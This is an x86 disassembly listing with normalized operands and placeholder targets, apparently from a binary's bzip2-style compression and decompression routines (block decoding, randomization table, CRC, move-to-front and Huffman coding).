cmp [ ebp - 0x8 ] edi
jne r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ebx [ ecx + 0xc4c ]
mov edx [ ebx + edx * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
cmp [ ecx + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
push 0x2
pop esi
mov [ ebp - 0x20 ] eax
cmp edx eax
jae r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
test esi esi
jle r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x2
cmp eax [ ebp - 0x1c ]
jae r-xdata
push 0x3
pop esi
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov ebx [ ebp - 0x1c ]
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x3
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx esi al
shr edx 0x8
add esi 0x4
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov edx [ ebx + edx * 4 ]
movzx eax dl
shr edx 0x8
add [ ebp - 0x8 ] 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
je r-xdata
and [ ecx + 0x18 ] 0x0
mov eax [ ecx + 0x38 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
xor edx edx
inc esi
cmp edi 0x1
sete dl
movzx eax al
mov [ ecx + 0x440 ] esi
xor edx eax
add edx 0x4
mov [ ecx + 0xc ] edx
mov edx [ ecx + 0x38 ]
cmp edx [ ebp - 0x1c ]
jae r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov eax [ ebx + edx * 4 ]
mov [ ecx + 0x38 ] eax
shr [ ecx + 0x38 ] 0x8
movzx eax al
mov [ ecx + 0x3c ] eax
test edi edi
jne r-xdata
and [ ecx + 0x18 ] 0x0
dec [ ecx + 0x14 ]
mov eax [ ecx + 0x14 ]
xor edx edx
cmp eax 0x1
sete dl
xor [ ecx + 0x3c ] edx
inc esi
mov [ ecx + 0x440 ] esi
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov edx [ eax * 4 + rw-data ]
inc eax
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x18 ] eax
cmp eax 0x200
jne r-xdata
and [ ecx + 0x18 ] edi
sub_1001ca87
push esi
xor eax eax
mov edx 0x100
push edi
mov edx ecx
mov eax ecx
jmp r-xdata
mov esi [ esp + 0xc ]
mov edi [ esp + 0x10 ]
lea ecx [ edx + eax ]
sar ecx 0x1
cmp esi [ edi + ecx * 4 ]
jl r-xdata
pop edi
pop esi
retn
mov ecx edx
sub ecx eax
cmp ecx 0x1
jne r-xdata
sub_1001cab4
push ebp
mov ebp esp
sub esp 0x10
cmp [ esi + 0x10 ] 0x0
push ebx
push edi
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
xor al al
jmp r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
pop edi
pop ebx
leave
retn
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
mov al 0x1
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001ca87
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x440 ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001ca87
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ esi + 0x440 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001ca87
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001ca87
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001ca87
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001ca87
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001ca87
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
movzx eax [ ebp - 0x1 ]
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_1001ca87
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edi ]
movzx ecx al
movzx eax [ ebx + eax * 2 ]
and cl 0x1
shl cl 0x2
shr edx cl
and edx 0xf
shl edx 0x10
or edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x38 ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
and [ esi + 0x18 ] 0x0
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001ca87
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
dec [ esi + 0x14 ]
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0x14 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
xor eax eax
cmp ecx 0x1
movzx ecx [ ebp - 0x1 ]
sete al
xor eax ecx
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_1001ca87
mov edx [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx edx
shr ecx 0x1
mov [ esi + 0x3c ] eax
movzx edi [ ecx + edi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
movzx ecx [ ebx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
mov ecx [ esi + 0x14 ]
mov [ esi + 0x38 ] edi
test ecx ecx
jne r-xdata
and [ esi + 0x18 ] 0x0
dec [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
xor edx edx
cmp ecx 0x1
sete dl
xor edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x3c ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ ecx * 4 + rw-data ]
inc ecx
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] ecx
cmp ecx 0x200
jne r-xdata
and [ esi + 0x18 ] 0x0
sub_1001d0d4
test eax eax
jne r-xdata
push esi
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop esi
retn
cmp [ esi ] eax
je r-xdata
mov ecx [ esi + 0x4 ]
push ebx
cmp ecx 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ecx 0x2
jne r-xdata
pop ebx
pop esi
retn
mov ecx [ esi + 0x4 ]
cmp ecx 0xa
jl r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov ebx esi
call sub_1001f06f
cmp eax 0x4
je r-xdata
mov ecx esi
call sub_1001c5db
call sub_1001cab4
jmp r-xdata
cmp [ esi + 0x30 ] 0x3
jl r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx 0x2
jne r-xdata
push 0xfffffffc
pop eax
jmp r-xdata
mov eax [ esi + 0xfa40 ]
inc eax
cmp [ esi + 0x440 ] eax
jne r-xdata
test al al
jne r-xdata
mov eax [ esi + 0xc64 ]
sub eax [ esi + 0xc5c ]
neg eax
sbb eax eax
and eax 0xfffffff8
add eax 0x4
push [ esi + 0xc64 ]
push [ esi + 0xc5c ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0x10
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
cmp [ esi + 0x30 ] 0x3
mov eax [ esi + 0xc60 ]
not eax
mov [ esi + 0xc60 ] eax
jl r-xdata
cmp [ esi + 0x30 ] 0x2
jl r-xdata
push eax
push [ esi + 0xc58 ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0x10
mov ecx [ esi + 0xc60 ]
cmp ecx [ esi + 0xc58 ]
jne r-xdata
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
pop ecx
pop ecx
lea eax [ esi + 0xc64 ]
mov edx [ eax ]
rol edx 0x1
xor edx ecx
mov [ eax ] edx
mov [ esi + 0x4 ] 0xe
sub_1001d220
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop edi
retn
cmp [ edi ] esi
je r-xdata
mov eax [ edi + 0xc4c ]
test eax eax
je r-xdata
mov eax [ edi + 0xc50 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
mov edi [ edi + 0xc54 ]
test edi edi
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
push [ esi + 0x20 ]
push [ esi + 0x2c ]
call [ esi + 0x28 ]
and [ esi + 0x20 ] 0x0
pop ecx
pop ecx
xor eax eax
pop edi
retn
push edi
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
sub_1001d285
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi eax
xor eax eax
push edi
cmp ebx eax
je r-xdata
push 0xfffffffe
pop eax
cmp esi eax
je r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
lea edi [ ebp - 0x30 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
call sub_1001bfb7
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ esi ]
mov [ ebp - 0x1c ] eax
mov eax edi
mov [ ebp - 0x20 ] ebx
call sub_1001c489
mov edi eax
cmp edi 0x3
jne r-xdata
cmp edi 0x4
jne r-xdata
push 0xfffffff8
pop edi
jmp r-xdata
lea esi [ ebp - 0x30 ]
call sub_1001c500
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x1c ]
sub [ esi ] eax
xor edi edi
sub_1001d2fb
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
mov edi eax
mov ebx ecx
xor eax eax
cmp ebx eax
je r-xdata
push 0xfffffffe
pop eax
cmp edi eax
je r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
lea esi [ ebp - 0x30 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
call sub_1001c55c
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ edi ]
mov [ ebp - 0x1c ] eax
mov eax esi
mov [ ebp - 0x20 ] ebx
call sub_1001d0d4
mov ebx eax
test ebx ebx
jne r-xdata
cmp ebx 0x4
je r-xdata
cmp [ ebp - 0x1c ] eax
jbe r-xdata
mov eax [ ebp - 0x1c ]
sub [ edi ] eax
xor edi edi
lea esi [ ebp - 0x30 ]
call sub_1001d220
mov eax ebx
jmp r-xdata
push 0xfffffff8
jmp r-xdata
push 0xfffffff9
pop edi
jmp r-xdata
lea esi [ ebp - 0x30 ]
call sub_1001d220
mov eax edi
jmp r-xdata
sub_1001d389
cmp [ eax + 0x25c ] 0x8
push esi
push edi
mov esi ecx
jl r-xdata
mov edx [ eax + 0x25c ]
mov edi [ esp + 0xc ]
push 0x20
pop ecx
sub ecx edx
sub ecx edi
shl esi cl
add edx edi
pop edi
mov [ eax + 0x25c ] edx
or [ eax + 0x258 ] esi
pop esi
retn
lea ecx [ eax + 0x258 ]
push ebx
mov edi [ eax + 0x4c ]
mov bl [ ecx + 0x3 ]
mov edx [ eax + 0x2c ]
mov [ edx + edi ] bl
inc [ eax + 0x4c ]
shl [ ecx ] 0x8
add [ eax + 0x25c ] 0xfffffff8
cmp [ eax + 0x25c ] 0x8
jge r-xdata
pop ebx
sub_1001d3e4
push esi
mov ecx ebx
shr ecx 0x18
push 0x8
call sub_1001d389
mov ecx ebx
shr ecx 0x10
mov esi 0xff
and ecx esi
push 0x8
call sub_1001d389
mov ecx ebx
shr ecx 0x8
and ecx esi
push 0x8
call sub_1001d389
movzx ecx bl
push 0x8
call sub_1001d389
add esp 0x10
pop esi
retn
sub_1001d421
push ebp
lea ebp [ esp - 0x9c ]
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x98 ] eax
mov eax [ esi + 0x20 ]
mov [ ebp - 0x80 ] eax
mov eax [ esi + 0x24 ]
push ebx
mov ebx [ esi + 0x28 ]
mov [ ebp - 0x7c ] eax
xor eax eax
push edi
mov [ esi + 0x54 ] eax
inc eax
cmp eax 0x100
jl r-xdata
mov cl [ esi + 0x54 ]
mov [ eax + esi + 0x158 ] cl
inc [ esi + 0x54 ]
cmp [ esi + eax + 0x58 ] 0x0
je r-xdata
mov edx [ esi + 0x54 ]
inc edx
mov [ ebp - 0x78 ] edx
js r-xdata
xor eax eax
xor edi edi
cmp [ esi + 0x54 ] eax
mov [ ebp - 0x70 ] eax
jle r-xdata
lea edi [ esi + 0x278 ]
lea ecx [ edx + 0x1 ]
xor eax eax
[ edi ]
and [ ebp - 0x74 ] 0x0
cmp [ esi + 0x44 ] 0x0
jle r-xdata
mov ecx [ esi + 0x54 ]
mov ecx [ ebp + 0x98 ]
mov [ ebx + edi * 2 ] dx
lea eax [ esi + edx * 4 + 0x278 ]
inc [ eax ]
inc edi
mov [ esi + 0x274 ] edi
pop edi
xor ecx ebp
pop ebx
call sub_100242d7
add ebp 0x9c
leave
retn
mov eax [ ebp - 0x80 ]
mov ecx [ ebp - 0x74 ]
mov eax [ eax + ecx * 4 ]
dec eax
jns r-xdata
mov [ ebp + eax - 0x68 ] al
inc eax
cmp eax ecx
jl r-xdata
mov ecx [ ebp - 0x7c ]
movzx eax [ eax + ecx ]
mov al [ eax + esi + 0x158 ]
mov [ ebp - 0x69 ] al
cmp [ ebp - 0x68 ] al
jne r-xdata
add eax [ esi + 0x44 ]
mov eax [ ebp - 0x70 ]
test eax eax
jle r-xdata
inc [ ebp - 0x70 ]
jmp r-xdata
mov al [ ebp - 0x68 ]
mov cl [ ebp - 0x67 ]
mov [ ebp - 0x67 ] al
lea eax [ ebp - 0x67 ]
jmp r-xdata
dec eax
inc [ ebp - 0x74 ]
mov eax [ ebp - 0x74 ]
cmp eax [ esi + 0x44 ]
jl r-xdata
cmp [ ebp - 0x69 ] cl
jne r-xdata
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x278 ]
inc ecx
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x27c ]
jmp r-xdata
mov eax [ ebp - 0x70 ]
test eax eax
jle r-xdata
inc eax
mov dl cl
mov cl [ eax ]
mov [ eax ] dl
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x68 ] cl
lea ecx [ ebp - 0x68 ]
sub eax ecx
lea ecx [ eax + 0x1 ]
mov [ ebx + edi * 2 ] cx
lea eax [ esi + eax * 4 + 0x27c ]
inc edi
inc [ eax ]
and [ ebp - 0x70 ] 0x0
add eax 0xfffffffe
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
cmp eax 0x2
jl r-xdata
dec eax
xor ecx ecx
test al 0x1
je r-xdata
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x278 ]
inc ecx
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x27c ]
jmp r-xdata
add eax 0xfffffffe
cdq
sub eax edx
mov edx [ ebp - 0x78 ]
sar eax 0x1
jmp r-xdata
cmp eax 0x2
jl r-xdata
xor ecx ecx
test al 0x1
je r-xdata
sub_1001d5b7
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x268 ] 0x3
push ebx
mov ebx [ esi + 0x28 ]
push edi
jl r-xdata
mov edi [ esi + 0x54 ]
inc edi
inc edi
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x3c ] edi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x28 ] 0x6
push [ esi + 0x54 ]
push [ esi + 0x274 ]
push [ esi + 0x44 ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0x14
add [ ebp - 0xc ] 0x102
dec [ ebp - 0x28 ]
jne r-xdata
push edi
push 0xf
push [ ebp - 0xc ]
call sub_10024b80
add esp 0xc
test edi edi
jle r-xdata
mov eax [ esi + 0x274 ]
test eax eax
jg r-xdata
cmp eax 0xc8
jge r-xdata
push 0xbb9
cmp eax 0x258
jge r-xdata
mov [ ebp - 0x30 ] 0x2
jmp r-xdata
cmp eax 0x4b0
jge r-xdata
mov [ ebp - 0x30 ] 0x3
jmp r-xdata
mov ecx [ ebp - 0x30 ]
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] eax
test ecx ecx
jle r-xdata
xor ecx ecx
cmp eax 0x960
setge cl
add ecx 0x5
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x30 ] 0x4
jmp r-xdata
and [ ebp - 0x34 ] 0x0
and [ ebp - 0xc ] 0x0
mov eax ecx
add eax 0x91
imul eax eax 0x102
add eax esi
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x6
jne r-xdata
mov ecx [ ebp - 0x30 ]
xor eax eax
lea edi [ ebp - 0x5c ]
[ edi ]
mov eax [ ebp - 0x30 ]
lea edx [ esi + 0xb160 ]
mov [ ebp - 0x28 ] eax
cmp edi [ ebp - 0x24 ]
jle r-xdata
lea edx [ esi + edi * 4 + 0x278 ]
mov ecx [ esi + 0x274 ]
xor eax eax
cmp ecx eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
jle r-xdata
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
add edx 0x408
dec [ ebp - 0x28 ]
jne r-xdata
mov ecx [ ebp - 0x3c ]
xor eax eax
mov edi edx
[ edi ]
cmp [ esi + 0x268 ] 0x3
jl r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x30 ]
je r-xdata
add edx 0x4
